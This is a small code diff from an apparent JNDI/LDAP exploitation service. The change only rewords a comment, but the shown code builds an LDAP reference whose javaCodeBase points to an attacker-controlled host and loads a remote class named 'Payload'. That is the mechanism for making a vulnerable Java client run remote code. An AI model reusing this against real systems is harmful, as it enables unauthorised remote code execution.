@@ -92,7 +92,7 @@ class JNDI(services.Service):
         query_name = query[9:9 + query[8:][0]].decode()
         response = LDAPResponse(query_name, {
             'javaClassName': 'Payload',
-            'javaCodeBase': 'http://{rhost}:{rport}/'.format(**self.scenario.context), ## Path must be end with '/'
+            'javaCodeBase': 'http://{rhost}:{rport}/'.format(**self.scenario.context),  # NOTE: Path must end with '/'
             'objectClass': 'javaNamingReference',
             'javaFactory': 'Payload',
         })
